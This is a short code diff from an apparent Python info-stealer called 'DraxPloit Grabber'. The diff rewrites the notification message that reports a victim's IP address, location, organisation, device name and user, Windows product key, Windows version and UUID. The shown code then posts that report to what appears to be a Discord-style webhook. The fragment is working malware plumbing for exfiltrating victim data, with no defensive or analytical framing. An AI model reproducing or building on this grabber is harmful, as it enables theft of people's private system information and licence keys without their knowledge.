@@ -82,7 +82,7 @@ class Exploit:
             deviceUser = "N/A"
 
             
-        self.log = f"**DraxPloit** beamed a new user! ```\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}\n\nOrg: {org}\nDevice Name: {deviceName}\nDevice User: {deviceUser}\nWindows-Key: {w1nk33y}\nWindows Version: {w1nv3r}\nUUID: {uuidwndz}```"
+        self.log = f"**DraxPloit Grabber** beamed a **NEW** user: ```\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}\n\nOrg: {org}\nDevice Name: {deviceName}\nDevice User: {deviceUser}\nWindows-Key: {w1nk33y}\nWindows Version: {w1nv3r}\nUUID: {uuidwndz}```"
 
     def sendMainData(self):
         data = {"content": self.log, "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
